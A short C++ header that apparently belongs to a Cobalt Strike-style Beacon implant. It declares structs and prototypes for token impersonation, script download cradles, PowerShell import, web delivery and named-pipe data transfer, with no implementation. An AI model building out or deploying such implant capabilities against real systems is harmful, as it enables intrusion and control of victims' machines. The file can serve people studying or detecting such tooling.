#pragma once

#include "Utils.h"
#include "comm.h"
#include "common.h"
#include "BeaconJob.h"

extern HANDLE g_hToken;
extern HANDLE g_hObject;
extern HANDLE g_hHandle;

struct BeaconMiniHttp
{
	SOCKET socket;
	int payloadsize;
	int httpheadersize;
	char* payload;
	char* httpheader;
	char* rvcedata;
};

struct BeaconBackgroundThreads
{
	void* StartAddress;
	void* lpParameter;
	BOOL(WINAPI * pVirtualFree)(LPVOID,SIZE_T, DWORD);
};
void NamedPipesSendData(char* Taskdata, int Task_size);

void ScriptCradle(char* Taskdata, int Task_size);

void StartNamedPipeReceiveData(char* Taskdata, int Task_size);

void ImpersonationToken();

void BeaconPowerShellImport(char* Taskdata, int Task_size);
void BeaconWebDelivery(char* Taskdata, int Task_size);

void __cdecl CheckDownload(size_t size);